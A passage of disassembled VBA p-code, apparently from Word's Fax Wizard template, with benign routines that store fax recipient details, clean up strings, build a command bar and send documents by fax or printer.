iNumRcpnts \n' \tFor \n' Line #1698:\n' \tLd strRCPNT_NAME \n' \tLd i \n' \tConcat \n' \tLd i \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsLd rgstrRcpntFaxNames 0x0001 \n' \tLd objVars \n' \tArgsMemCall Add 0x0002 \n' Line #1699:\n' \tLd strRCPNT_NUMBER \n' \tLd i \n' \tConcat \n' \tLd i \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsLd rgstrRcpntFaxNums 0x0001 \n' \tLd objVars \n' \tArgsMemCall Add 0x0002 \n' Line #1700:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #1701:\n' \tEndIfBlock \n' Line #1702:\n' \tEndIfBlock \n' Line #1703:\n' Line #1704:\n' \tLd fNoCovSht \n' \tParen \n' \tIfBlock \n' Line #1705:\n' \tLitStr 0x0013 \"Cover Sheet Present\"\n' \tLitStr 0x0001 \"0\"\n' \tLd objVars \n' \tArgsMemCall Add 0x0002 \n' Line #1706:\n' \tElseBlock \n' Line #1707:\n' \tLitStr 0x0013 \"Cover Sheet Present\"\n' \tLitStr 0x0001 \"1\"\n' \tLd objVars \n' \tArgsMemCall Add 0x0002 \n' Line #1708:\n' \tEndIfBlock \n' Line #1709:\n' Line #1710:\n' \tLitStr 0x0001 \" \"\n' \tSt strFaxFld \n' Line #1711:\n' \tQuoteRem 0x0004 0x0021 \"store what fax option user chose.\"\n' Line #1712:\n' \tLd iFaxOption \n' \tLd iDIFF_FAX \n' \tEq \n' \tParen \n' \tIfBlock \n' Line #1713:\n' \tLitStr 0x000E \"MS Fax Present\"\n' \tLitStr 0x0001 \"0\"\n' \tLd objVars \n' \tArgsMemCall Add 0x0002 \n' Line #1714:\n' \tLitStr 0x000B \"Fax Printer\"\n' \tLd formWizard \n' \tMemLd cboFaxDriver \n' \tMemLd Then \n' \tLd objVars \n' \tArgsMemCall Add 0x0002 \n' Line #1715:\n' \tElseBlock \n' Line #1716:\n' \tLitStr 0x000E \"MS Fax Present\"\n' \tLitStr 0x0001 \"1\"\n' \tLd objVars \n' \tArgsMemCall Add 0x0002 \n' Line #1717:\n' \tLd fDocIsFormLtr \n' \tIfBlock \n' Line #1718:\n' \tLd formWizard \n' \tMemLd cboFldsFaxNum \n' \tMemLd Value \n' \tSt strFaxFld \n' Line #1719:\n' \tElseBlock \n' Line #1720:\n' \tLd strFLD_FAX_NUMBER \n' \tSt strFaxFld \n' Line #1721:\n' \tEndIfBlock \n' Line #1722:\n' \tEndIfBlock \n' Line #1723:\n' Line #1724:\n' \tLitStr 0x000E \"Fax Field Name\"\n' \tLd strFaxFld \n' \tLd objVars \n' \tArgsMemCall Add 0x0002 \n' Line #1725:\n' Line #1726:\n' \tQuoteRem 0x0004 0x004A \"if doc. is present and is to be faxed then store relevant info. about doc.\"\n' Line #1727:\n' \tLd fDocPresent \n' \tLd formWizard \n' \tMemLd optCovSht \n' \tMemLd Value \n' \tParen \n' \tNot \n' \tParen \n' \tAnd \n' \tParen \n' \tIfBlock \n' Line #1728:\n' \tLitStr 0x0010 \"Main Doc Present\"\n' \tLitStr 0x0001 \"1\"\n' \tLd objVars \n' \tArgsMemCall Add 0x0002 \n' Line #1729:\n' \tLitStr 0x0012 \"Main Document Name\"\n' \tLd objMainDoc \n' \tMemLd New \n' \tLd objVars \n' \tArgsMemCall Add 0x0002 \n' Line #1730:\n' Line #1731:\n' \tQuoteRem 0x0008 0x0035 \"is the field a fax number or an Address Book Entry???\"\n' Line #1732:\n' \tLineCont 0x0004 0A 00 10 00\n' \tLd fDocIsFormLtr \n' \tParen \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x000D \"Through Email\"\n' \tLd formWizard \n' \tMemLd optFldFaxEntry \n' \tMemLd Value \n' \tLd objVars \n' \tArgsMemCall Add 0x0002 \n' \tEndIf \n' Line #1733:\n' Line #1734:\n' \tElseBlock \n' Line #1735:\n' Line #1736:\n' \tLitStr 0x0010 \"Main Doc Present\"\n' \tLitStr 0x0001 \"0\"\n' \tLd objVars \n' \tArgsMemCall Add 0x0002 \n' Line #1737:\n' Line #1738:\n' \tEndIfBlock \n' Line #1739:\n' Line #1740:\n' \tEndSub \n' Line #1741:\n' Line #1742:\n' Line #1743:\n' \tQuoteRem 0x0000 0x002E \"removes vbCR & vbLF from the end of the string\"\n' Line #1744:\n' \tQuoteRem 0x0000 0x002E \"until the last character is not a vbLf or vbCr\"\n' Line #1745:\n' \tFuncDefn (Public Function StrRemoveCrLfFromEnd(strText As String, id_FFFE As String) As String)\n' Line #1746:\n' \tDim \n' \tVarDefn strChar (As String)\n' Line #1747:\n' \tDim \n' \tVarDefn i (As Integer)\n' Line #1748:\n' Line #1749:\n' \tLd strText \n' \tFnLen \n' \tSt i \n' Line #1750:\n' \tLd i \n' \tLitDI2 0x0000 \n' \tEq \n' \tParen \n' \tIf \n' \tBoSImplicit \n' \tGoTo LEnd \n' \tEndIf \n' Line #1751:\n' Line #1752:\n' \tLd strText \n' \tLd i \n' \tLitDI2 0x0001 \n' \tArgsLd Mid$$ 0x0003 \n' \tSt strChar \n' Line #1753:\n' \tQuoteRem 0x0004 0x001C \"check for the last character\"\n' Line #1754:\n' \tLd strChar \n' \tLd vbLf \n' \tEq \n' \tParen \n' \tLd strChar \n' \tLd vbCr \n' \tEq \n' \tParen \n' \tOr \n' \tWhile \n' Line #1755:\n' \tLd i \n' \tLitDI2 0x0001 \n' \tSub \n' \tSt i \n' Line #1756:\n' \tLd strText \n' \tLd i \n' \tLitDI2 0x0001 \n' \tArgsLd Mid$$ 0x0003 \n' \tSt strChar \n' Line #1757:\n' \tWend \n' Line #1758:\n' Line #1759:\n' \tLabel LEnd \n' Line #1760:\n' \tLd strText \n' \tLd i \n' \tArgsLd LBound$ 0x0002 \n' \tSt StrRemoveCrLfFromEnd \n' Line #1761:\n' \tEndFunc \n' Line #1762:\n' \tQuoteRem 0x0000 0x0026 \"counts the number of lines in a string\"\n' Line #1763:\n' \tFuncDefn (Public Function ICountLines(ByVal strWhat As String, strNewText As String, iMax As Integer, id_FFFE As Integer) As Integer)\n' Line #1764:\n' \tDim \n' \tVarDefn cLines (As Integer)\n' \tVarDefn iPos (As Integer)\n' Line #1765:\n' Line #1766:\n' \tLitStr 0x0000 \"\"\n' \tSt strNewText \n' Line #1767:\n' \tLitDI2 0x0000 \n' \tSt cLines \n' Line #1768:\n' \tLd strWhat \n' \tLd vbCr \n' \tFnInStr \n' \tSt iPos \n' Line #1769:\n' \tLd iPos \n' \tWhile \n' Line #1770:\n' \tLd iPos \n' \tLd strWhat \n' \tFnLen \n' \tLt \n' \tIfBlock \n' Line #1771:\n' \tLd cLines \n' \tLd iMax \n' \tLt \n' \tIf \n' \tBoSImplicit \n' \tLd strNewText \n' \tLd strWhat \n' \tLd iPos \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsLd LBound$ 0x0002 \n' \tConcat \n' \tSt strNewText \n' \tEndIf \n' Line #1772:\n' \tLd cLines \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt cLines \n' Line #1773:\n' \tLd strWhat \n' \tLd iPos \n' \tLitDI2 0x0001 \n' \tAdd \n' \tArgsLd Mid$$ 0x0002 \n' \tSt strWhat \n' Line #1774:\n' \tLd strWhat \n' \tLd vbCr \n' \tFnInStr \n' \tSt iPos \n' Line #1775:\n' \tElseBlock \n' Line #1776:\n' \tLd cLines \n' \tLd iMax \n' \tLt \n' \tIf \n' \tBoSImplicit \n' \tLd strNewText \n' \tLd strWhat \n' \tLd iPos \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsLd LBound$ 0x0002 \n' \tConcat \n' \tSt strNewText \n' \tEndIf \n' Line #1777:\n' \tLd strWhat \n' \tFnLen \n' \tLitDI2 0x0001 \n' \tGt \n' \tIf \n' \tBoSImplicit \n' \tLd cLines \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt cLines \n' \tEndIf \n' Line #1778:\n' \tLitStr 0x0000 \"\"\n' \tSt strWhat \n' Line #1779:\n' \tLitDI2 0x0000 \n' \tSt iPos \n' Line #1780:\n' \tEndIfBlock \n' Line #1781:\n' \tWend \n' Line #1782:\n' \tLd strWhat \n' \tLitStr 0x0000 \"\"\n' \tNe \n' \tIfBlock \n' Line #1783:\n' \tLd cLines \n' \tLd iMax \n' \tLt \n' \tIf \n' \tBoSImplicit \n' \tLd strNewText \n' \tLd strWhat \n' \tConcat \n' \tSt strNewText \n' \tEndIf \n' Line #1784:\n' \tLd cLines \n' \tLitDI2 0x0001 \n' \tAdd \n' \tSt cLines \n' Line #1785:\n' \tEndIfBlock \n' Line #1786:\n' Line #1787:\n' \tLd cLines \n' \tSt ICountLines \n' Line #1788:\n' Line #1789:\n' \tEndFunc \n' \tQuoteRem 0x000E 0x000B \" CountLines\"\n' Line #1790:\n' Line #1791:\n' \tQuoteRem 0x0000 0x006F \"inserts a field of type iFldType at the given range with strText as the text. Field replaces the text in objRng\"\n' Line #1792:\n' \tQuoteRem 0x0000 0x0047 \"so pass a collapsed range always.and updates the range to be at the end\"\n' Line #1793:\n' \tQuoteRem 0x0000 0x0016 \"of the inserted field.\"\n' Line #1794:\n' \tFuncDefn (Private Sub InsertField(objRng As , iFldType, strText As String, fPreserveFormatting))\n' Line #1795:\n' \tDim \n' \tVarDefn objFld (As Field)\n' Line #1796:\n' Line #1797:\n' \tOnError FatalError \n' Line #1798:\n' Line #1799:\n' \tSetStmt \n' \tLd objRng \n' \tLd iFldType \n' \tLd strText \n' \tLd fPreserveFormatting \n' \tLd objRng \n' \tMemLd Fields \n' \tArgsMemLd Add 0x0004 \n' \tSet objFld \n' Line #1800:\n' Line #1801:\n' \tSetStmt \n' \tLd objFld \n' \tMemLd result \n' \tSet objRng \n' Line #1802:\n' \tStartWithExpr \n' \tLd objRng \n' \tWith \n' Line #1803:\n' \tLd wdCollapseEnd \n' \tArgsMemCallWith Collapse 0x0001 \n' Line #1804:\n' \tMemLdWith End \n' \tLitDI2 0x0001 \n' \tAdd \n' \tMemStWith End \n' Line #1805:\n' \tMemLdWith End \n' \tMemStWith Start \n' Line #1806:\n' \tEndWith \n' Line #1807:\n' Line #1808:\n' \tExitSub \n' Line #1809:\n' \tLabel FatalError \n' Line #1810:\n' \tLd Err \n' \tArgsCall ReportError 0x0001 \n' Line #1811:\n' Line #1812:\n' \tEndSub \n' Line #1813:\n' \tQuoteRem 0x0000 0x004B \"replaces all occurences of vbCR & vbLF with the delimiter string in strText\"\n' Line #1814:\n' \tQuoteRem 0x0000 0x0016 \"returns the new string\"\n' Line #1815:\n' \tFuncDefn (Private Function StrReplaceCrLfWithText(strText As String, strDelim As String, id_FFFE As String) As String)\n' Line #1816:\n' \tDim \n' \tVarDefn strRet (As String)\n' \tVarDefn strTmp (As String)\n' Line #1817:\n' Line #1818:\n' \tLitStr 0x0000 \"\"\n' \tSt strRet \n' Line #1819:\n' \tLd strText \n' \tSt strTmp \n' Line #1820:\n' \tLd strTmp \n' \tFnLen \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tGoTo LEnd \n' \tEndIf \n' Line #1821:\n' Line #1822:\n' \tLd strTmp \n' \tArgsLd StrRemoveCrLfFromEnd 0x0001 \n' \tSt strRet \n' Line #1823:\n' \tQuoteRem 0x0004 0x0024 \"remove vbLf thro' search and replace\"\n' Line #1824:\n' \tLd strRet \n' \tLd vbLf \n' \tLitStr 0x0000 \"\"\n' \tArgsLd StrSearchReplace 0x0003 \n' \tSt strTmp \n' Line #1825:\n' \tQuoteRem 0x0004 0x0031 \"now replace all occurrences of vbCr with strDelim\"\n' Line #1826:\n' \tLd strTmp \n' \tLd vbCr \n' \tLd strDelim \n' \tArgsLd StrSearchReplace 0x0003 \n' \tSt strRet \n' Line #1827:\n' \tLabel LEnd \n' Line #1828:\n' \tLd strRet \n' \tSt StrReplaceCrLfWithText \n' Line #1829:\n' Line #1830:\n' \tEndFunc \n' Line #1831:\n' Line #1832:\n' \tQuoteRem 0x0000 0x002B \"removes the character strSrch from strText.\"\n' Line #1833:\n' \tQuoteRem 0x0000 0x003E \"caller should make sure that strSrch is a one character string\"\n' Line #1834:\n' \tQuoteRem 0x0000 0x002D \"returns the string stripped off the character\"\n' Line #1835:\n' \tFuncDefn (Private Function StrSearchReplace(strText As String, strSrch As String, strReplace As String, id_FFFE As Variant))\n' Line #1836:\n' \tDim \n' \tVarDefn strRet (As String)\n' \tVarDefn strTmp (As String)\n' Line #1837:\n' \tDim \n' \tVarDefn iPos (As Integer)\n' Line #1838:\n' Line #1839:\n' \tLitStr 0x0000 \"\"\n' \tSt strRet \n' Line #1840:\n' \tLd strText \n' \tSt strTmp \n' Line #1841:\n' Line #1842:\n' \tLd strTmp \n' \tLd strSrch \n' \tFnInStr \n' \tSt iPos \n' Line #1843:\n' Line #1844:\n' \tLd iPos \n' \tParen \n' \tWhile \n' \tQuoteRem 0x0011 0x0013 \"presence of strChar\"\n' Line #1845:\n' \tLd strRet \n' \tLd strTmp \n' \tLd iPos \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsLd LBound$ 0x0002 \n' \tConcat \n' \tSt strRet \n' Line #1846:\n' \tLd iPos \n' \tLd strTmp \n' \tFnLen \n' \tLt \n' \tParen \n' \tIfBlock \n' Line #1847:\n' \tLd strRet \n' \tLd strReplace \n' \tConcat \n' \tSt strRet \n' Line #1848:\n' \tLd strTmp \n' \tLd iPos \n' \tLitDI2 0x0001 \n' \tAdd \n' \tArgsLd Mid$$ 0x0002 \n' \tSt strTmp \n' Line #1849:\n' \tLd strTmp \n' \tLd strSrch \n' \tFnInStr \n' \tSt iPos \n' Line #1850:\n' \tElseBlock \n' \tQuoteRem 0x000D 0x001D \"strSrch is the last character\"\n' Line #1851:\n' \tLitStr 0x0000 \"\"\n' \tSt strTmp \n' Line #1852:\n' \tLitDI2 0x0000 \n' \tSt iPos \n' Line #1853:\n' \tEndIfBlock \n' Line #1854:\n' \tWend \n' Line #1855:\n' Line #1856:\n' \tQuoteRem 0x0004 0x002E \"append whatever is left of the original string\"\n' Line #1857:\n' \tLd strRet \n' \tLd strTmp \n' \tConcat \n' \tSt strRet \n' Line #1858:\n' Line #1859:\n' \tLd strRet \n' \tSt StrSearchReplace \n' Line #1860:\n' \tEndFunc \n' Line #1861:\n' Line #1862:\n' \tQuoteRem 0x0000 0x0041 \"Errors in SaveRcpntsInDocVars & CreateCmdBar gets propagated back\"\n' Line #1863:\n' \tQuoteRem 0x0000 0x000D \"this function\"\n' Line #1864:\n' \tFuncDefn (Public Sub SetupDocForFax(fDummy As Boolean))\n' Line #1865:\n' \tOnError FatalError \n' Line #1866:\n' Line #1867:\n' \tLd iFaxOption \n' \tLd iNO_FAX \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tExitSub \n' \tEndIf \n' Line #1868:\n' Line #1869:\n' \tLineCont 0x0004 13 00 0C 00\n' \tLd fDocIsFormLtr \n' \tParen \n' \tNot \n' \tParen \n' \tLd iNumRcpnts \n' \tLitDI2 0x0000 \n' \tEq \n' \tParen \n' \tAnd \n' \tLd iFaxOption \n' \tLd iMS_FAX \n' \tEq \n' \tParen \n' \tAnd \n' \tIf \n' \tBoSImplicit \n' \tExitSub \n' \tEndIf \n' Line #1870:\n' Line #1871:\n' \tQuoteRem 0x0004 0x0028 \"dont save recipient info for form letter\"\n' Line #1872:\n' \tLd fDocIsFormLtr \n' \tParen \n' \tNot \n' \tParen \n' \tArgsCall SaveRcpntsInDocVars 0x0001 \n' Line #1873:\n' Line #1874:\n' \tLd fNoCovSht \n' \tParen \n' \tIfBlock \n' \tQuoteRem 0x0018 0x000C \"fax the doc.\"\n' Line #1875:\n' \tLd fDocIsFormLtr \n' \tParen \n' \tNot \n' \tParen \n' \tIfBlock \n' Line #1876:\n' \tArgsCall FaxRegDoc 0x0000 \n' Line #1877:\n' \tElseBlock \n' Line #1878:\n' \tArgsCall FaxFormLtr 0x0000 \n' Line #1879:\n' \tEndIfBlock \n' Line #1880:\n' \tElseBlock \n' Line #1881:\n' \tArgsCall CreateCmdBar 0x0000 \n' Line #1882:\n' \tEndIfBlock \n' Line #1883:\n' Line #1884:\n' \tExitSub \n' Line #1885:\n' \tLabel FatalError \n' Line #1886:\n' \tLd strERR_CREATING_CMDBAR \n' \tArgsCall DisplayErrorMsg 0x0001 \n' Line #1887:\n' \tLd Err \n' \tArgsCall ReportError 0x0001 \n' Line #1888:\n' \tEndSub \n' Line #1889:\n' \tQuoteRem 0x0000 0x002D \"Error will be taken care of in SetupDocForFax\"\n' Line #1890:\n' \tFuncDefn (Private Sub CreateCmdBar())\n' Line #1891:\n' \tDim \n' \tVarDefn objCmdBar (As CommandBar)\n' Line #1892:\n' \tDim \n' \tVarDefn objBtn (As CommandBarButton)\n' Line #1893:\n' Line #1894:\n' \tLd ActiveDocument \n' \tLd Application \n' \tMemSt CustomizationContext \n' Line #1895:\n' \tSetStmt \n' \tLd strCMD_BAR_TITLE \n' \tLd msoBarFloating \n' \tParamNamed Position \n' \tLitVarSpecial (True)\n' \tParamNamed Temporary \n' \tLd Application \n' \tMemLd CommandBars \n' \tArgsMemLd Add 0x0003 \n' \tSet objCmdBar \n' Line #1896:\n' Line #1897:\n' \tQuoteRem 0x0004 0x000C \"Add a button\"\n' Line #1898:\n' \tSetStmt \n' \tLd msoControlButton \n' \tLitVarSpecial (True)\n' \tParamNamed Temporary \n' \tLd objCmdBar \n' \tMemLd Controls \n' \tArgsMemLd Add 0x0002 \n' \tSet objBtn \n' Line #1899:\n' \tLd msoButtonCaption \n' \tLd objBtn \n' \tMemSt Style \n' Line #1900:\n' \tLd strCMD_BTN_TEXT \n' \tLd objBtn \n' \tMemSt Caption \n' Line #1901:\n' Line #1902:\n' \tLd fDocIsFormLtr \n' \tParen \n' \tNot \n' \tParen \n' \tIfBlock \n' Line #1903:\n' \tLitStr 0x000D \"Fax.FaxRegDoc\"\n' \tLd objBtn \n' \tMemSt OnAction \n' Line #1904:\n' \tElseBlock \n' Line #1905:\n' \tLitStr 0x000E \"Fax.FaxFormLtr\"\n' \tLd objBtn \n' \tMemSt OnAction \n' Line #1906:\n' \tEndIfBlock \n' Line #1907:\n' Line #1908:\n' \tLitVarSpecial (True)\n' \tLd objCmdBar \n' \tMemSt Visible \n' Line #1909:\n' Line #1910:\n' \tLitVarSpecial (True)\n' \tSt fCreatedCmdBar \n' Line #1911:\n' \tExitSub \n' Line #1912:\n' Line #1913:\n' \tEndSub \n' Line #1914:\n' Line #1915:\n' \tQuoteRem 0x0000 0x004B \"Cover sheet is deleted after faxing if no cover sheet is opted by user. So,\"\n' Line #1916:\n' \tQuoteRem 0x0000 0x0026 \"Activedocument is new cover sheet doc.\"\n' Line #1917:\n' \tFuncDefn (Private Sub FaxRegDoc())\n' Line #1918:\n' Line #1919:\n' \tDim \n' \tVarDefn fMSFax (As Boolean)\n' Line #1920:\n' \tDim \n' \tVarDefn fCovSht (As Boolean)\n' Line #1921:\n' \tDim \n' \tVarDefn iNumRcpnts (As Integer)\n' Line #1922:\n' \tDim \n' \tOptionBase \n' \tLd iMAX_RCPNTS \n' \tVarDefn rgstrFaxNames (As String)\n' Line #1923:\n' \tDim \n' \tOptionBase \n' \tLd iMAX_RCPNTS \n' \tVarDefn rgstrFaxNums (As String)\n' Line #1924:\n' \tDim \n' \tVarDefn i (As Integer)\n' Line #1925:\n' \tDim \n' \tVarDefn strDocName (As String)\n' Line #1926:\n' \tDim \n' \tVarDefn objVars (As Variables)\n' Line #1927:\n' \tDim \n' \tVarDefn fMainDocPresent (As Integer)\n' Line #1928:\n' \tDim \n' \tVarDefn strErrorMsg (As String)\n' Line #1929:\n' \tDim \n' \tVarDefn strFaxPrinter (As String)\n' \tVarDefn strActivePrinter (As String)\n' Line #1930:\n' \tDim \n' \tVarDefn objTmpMM (As MailMerge)\n' \tVarDefn strFaxFld (As String)\n' Line #1931:\n' \tDim \n' \tVarDefn fSendMailAttach (As Boolean)\n' Line #1932:\n' Line #1933:\n' Line #1934:\n' \tOnError FatalError \n' Line #1935:\n' \tLd strERR_SEND_FAX \n' \tSt strErrorMsg \n' Line #1936:\n' \tLd Application \n' \tMemLd Options \n' \tMemLd SendMailAttach \n' \tSt fSendMailAttach \n' Line #1937:\n' Line #1938:\n' \tSetStmt \n' \tLd ActiveDocument \n' \tMemLd Variables \n' \tSet objVars \n' Line #1939:\n' Line #1940:\n' \tLd strNUM_RCPNTS \n' \tArgsLd objVars 0x0001 \n' \tMemLd Value \n' \tArgsLd Val 0x0001 \n' \tSt iNumRcpnts \n' Line #1941:\n' Line #1942:\n' \tLitStr 0x0013 \"Cover Sheet Present\"\n' \tArgsLd objVars 0x0001 \n' \tMemLd Value \n' \tArgsLd Val 0x0001 \n' \tSt fCovSht \n' Line #1943:\n' \tLitStr 0x000E \"MS Fax Present\"\n' \tArgsLd objVars 0x0001 \n' \tMemLd Value \n' \tArgsLd Val 0x0001 \n' \tSt fMSFax \n' Line #1944:\n' \tLitStr 0x0010 \"Main Doc Present\"\n' \tArgsLd objVars 0x0001 \n' \tMemLd Value \n' \tArgsLd Val 0x0001 \n' \tSt fMainDocPresent \n' Line #1945:\n' \tLitStr 0x000E \"Fax Field Name\"\n' \tArgsLd objVars 0x0001 \n' \tMemLd Value \n' \tSt strFaxFld \n' Line #1946:\n' Line #1947:\n' \tLd fMainDocPresent \n' \tIfBlock \n' Line #1948:\n' \tQuoteRem 0x0008 0x001E \"obtain handle to main document\"\n' Line #1949:\n' \tLitStr 0x0012 \"Main Document Name\"\n' \tArgsLd objVars 0x0001 \n' \tMemLd Value \n' \tSt strDocName \n' Line #1950:\n' \tLd objMainDoc \n' \tLd strDocName \n' \tArgsLd FInvalidMainDoc 0x0002 \n' \tIf \n' \tBoSImplicit \n' \tExitSub \n' \tEndIf \n' Line #1951:\n' \tQuoteRem 0x0008 0x0032 \"Set objMainDoc = Application.Documents(strDocName)\"\n' Line #1952:\n' \tEndIfBlock \n' Line #1953:\n' Line #1954:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0001 \n' \tLd iNumRcpnts \n' \tFor \n' Line #1955:\n' \tLd strRCPNT_NAME \n' \tLd i \n' \tConcat \n' \tArgsLd objVars 0x0001 \n' \tMemLd Value \n' \tLd i \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsSt rgstrFaxNames 0x0001 \n' Line #1956:\n' \tLd strRCPNT_NUMBER \n' \tLd i \n' \tConcat \n' \tArgsLd objVars 0x0001 \n' \tMemLd Value \n' \tLd i \n' \tLitDI2 0x0001 \n' \tSub \n' \tArgsSt rgstrFaxNums 0x0001 \n' Line #1957:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #1958:\n' Line #1959:\n' \tQuoteRem 0x0004 0x003E \"if nonMSFax, then set the Fax driver to be the current printer\"\n' Line #1960:\n' \tLd fMSFax \n' \tParen \n' \tNot \n' \tParen \n' \tIfBlock \n' Line #1961:\n' \tLd Application \n' \tMemLd ActivePrinter \n' \tSt strActivePrinter \n' Line #1962:\n' \tLitStr 0x000B \"Fax Printer\"\n' \tArgsLd objVars 0x0001 \n' \tMemLd Value \n' \tSt strFaxPrinter \n' Line #1963:\n' \tLd strFaxPrinter \n' \tFnLen \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLitStr 0x0001 \" \"\n' \tSt strFaxPrinter \n' \tEndIf \n' Line #1964:\n' \tLd strFaxPrinter \n' \tLd Application \n' \tMemSt ActivePrinter \n' Line #1965:\n' \tEndIfBlock \n' Line #1966:\n' Line #1967:\n' \tQuoteRem 0x0004 0x0019 \"fax the cover sheet first\"\n' Line #1968:\n' \tLd fCovSht \n' \tParen \n' \tIfBlock \n' Line #1969:\n' \tLd iNumRcpnts \n' \tLitDI2 0x0001 \n' \tGt \n' \tParen \n' \tIfBlock \n' Line #1970:\n' \tSetStmt \n' \tLd ActiveDocument \n' \tMemLd MailMerge \n' \tSet objTmpMM \n' Line #1971:\n' \tLd fMSFax \n' \tIfBlock \n' Line #1972:\n' \tLd wdSendToFax \n' \tLd objTmpMM \n' \tMemSt Destination \n' Line #1973:\n' \tQuoteRem 0x0010 0x0024 \"MsgBox \"MailMerging the cover sheet\"\"\n' Line #1974:\n' \tElseBlock \n' \tQuoteRem 0x0011 0x000A \"non MS fax\"\n' Line #1975:\n' \tLd wdSendToPrinter \n' \tLd objTmpMM \n' \tMemSt Destination \n' Line #1976:\n' \tEndIfBlock \n' Line #1977:\n' \tLitVarSpecial (True)\n' \tLd objTmpMM \n' \tMemSt MailAsAttachment \n' Line #1978:\n' \tLd strFaxFld \n' \tLd objTmpMM \n' \tMemSt MailAddressFieldName \n' Line #1979:\n' \tLd strFAXING_CS_RECIPIENTS \n' \tSt StatusBar \n' Line #1980:\n' \tLd objTmpMM \n' \tArgsMemCall Execute 0x0000 \n' Line #1981:\n' Line #1982:\n' \tLd iNumRcpnts \n' \tLitDI2 0x0001 \n' \tEq \n' \tParen \n' \tLd fMSFax \n' \tAnd \n' \tElseIfBlock \n' Line #1983:\n' \tLd strFAXING_CS_TO \n' \tLitStr 0x0001 \" \"\n' \tConcat \n' \tLitDI2 0x0000 \n' \tArgsLd rgstrFaxNums 0x0001 \n' \tConcat \n' \tLitStr 0x0003 \"...\"\n' \tConcat \n' \tSt StatusBar \n' Line #1984:\n' \tLitVarSpecial (True)\n' \tLd Application \n' \tMemLd Options \n' \tMemSt SendMailAttach \n' Line #1985:\n' \tLitDI2 0x0000 \n' \tArgsLd rgstrFaxNums 0x0001 \n' \tLd ActiveDocument \n' \tArgsMemCall SendFax 0x0001 \n' Line #1986:\n' \tQuoteRem 0x0010 0x0039 \"MsgBox \"Faxing to  \" & rgstrFaxNames(0) & rgstrFaxNums(0)\"\n' Line #1987:\n' \tElseBlock \n' \tQuoteRem 0x000D 0x000A \"non MS fax\"\n' Line #1988:\n' \tLd strFAXING_CS_RECIPIENT \n' \tLitStr 0x0003 \"...\"\n' \tConcat \n' \tSt StatusBar \n' Line #1989:\n' \tLd ActiveDocument \n' \tArgsMemCall PrintOut 0x0000 \n' Line #1990:\n' \tEndIfBlock \n' Line #1991:\n' \tEndIfBlock \n' Line #1992:\n' Line #1993:\n' \tLd fMainDocPresent \n' \tLitDI2 0x0000 \n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tGoTo LResetPrinter \n' \tEndIf \n' \tQuoteRem 0x0033 0x001A \"if no main doc. then deesh\"\n' Line #1994:\n' Line #1995:\n' \tLd iNumRcpnts \n' \tLitDI2 0x0000 \n' \tEq \n' \tParen \n' \tLd fMSFax \n' \tParen \n' \tNot \n' \tAnd \n' \tIf \n' \tBoSImplicit \n' \tLd objMainDoc \n' \tArgsMemCall PrintOut 0x0000 \n' \tEndIf \n' Line #1996:\n' Line #1997:\n' \tQuoteRem 0x0004 0x0012 \"send the main doc.\"\n' Line #1998:\n' \tLd fMSFax \n' \tIf \n' \tBoSImplicit \n' \tLitVarSpecial (True)\n' \tLd Application \n' \tMemLd Options \n' \tMemSt SendMailAttach \n' \tEndIf \n' Line #1999:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tLitDI2 0x0000 \n' \tLd iNumRcpnts \n' \tLitDI2 0x0001 \n' \tSub \n' \tFor \n' Line #2000:\n' \tLd fMSFax \n' \tIfBlock \n' Line #2001:\n' \tLd strFAXING_DOC_TO \n' \tLitStr 0x0001 \" \"\n' \tConcat \n' \tLd i \n' \tArgsLd rgstrFaxNums 0x0001 \n' \tConcat \n' \tSt StatusBar \n' Line #2002:\n' \tLd i \n' \tArgsLd rgstrFaxNums 0x0001 \n' \tLd objMainDoc \n' \tArgsMemCall SendFax 0x0001 \n' Line #2003:\n' \tQuoteRem 0x000C 0x0039 \"MsgBox \"Faxing to  \" & rgstrFaxNames(i) & rgstrFaxNums(i)\"\n' Line #2004:\n' \tElseBlock \n' Line #2005:\n' \tLd strFAXING_DOC_RECIPIENT \n' \tLitStr 0x0001 \" \"\n' \tConcat \n' \tLd i \n' \tLitDI2 0x0001 \n' \tAdd \n' \tCoerce (Str) \n' \tConcat \n' \tLitStr 0x0003 \"...\"\n' \tConcat \n' \tSt StatusBar \n' Line #2006:\n' \tLd objMainDoc \n' \tArgsMemCall PrintOut 0x0000 \n' Line #2007:\n' \tEndIfBlock \n' Line #2008:\n' Line #2009:\n' \tStartForVariable \n' \tLd i \n' \tEndForVariable \n' \tNextVar \n' Line #2010:\n' Line #2011:\n' \tLabel LResetPrinter \n' Line #2012:\n' \tQuoteRem 0x0000 0x001C \"reset printer for non MS fax\"\n' Line #2013:\n' \tLd fMSFax \n' \tIfBlock \n' Line #2014:\n' \tLd fSendMailAttach \n' \tLd Application \n' \tMemLd Options \n' \tMemSt SendMailAttach \n' Line #2015:\n' \tElseBlock \n' Line #2016:\n' \tLd strActivePrinter \n' \tLd Application \n' \tMemSt ActivePrinter \n' Line #2017:\n' \tEndIfBlock \n' Line #2018:\n' \tLd strMSG_FAX_SUCCESS \n' \tLitVarSpecial (True)\n' \tArgsCall DisplayPostWizTip 0x0002 \n' Line #2019:\n' \tQuoteRem 0x0004 0x001D \"DeleteCmdBar strCMD_BAR_TITLE\"\n' Line #2020:\n' \tExitSub \n' Line #2021:\n' Line #2022:\n' \tLabel FatalError \n' Line #2023:\n' \tLd Err \n' \tMemLd Number \n' \tSt i \n' Line #2024:\n' \tLd i \n' \tIf \n' \tBoSImplicit \n' \tLd strErrorMsg \n' \tLd vbCr \n' \tConcat \n' \tLd Err \n' \tMemLd Description \n' \tConcat \n' \tSt strErrorMsg \n' \tEndIf 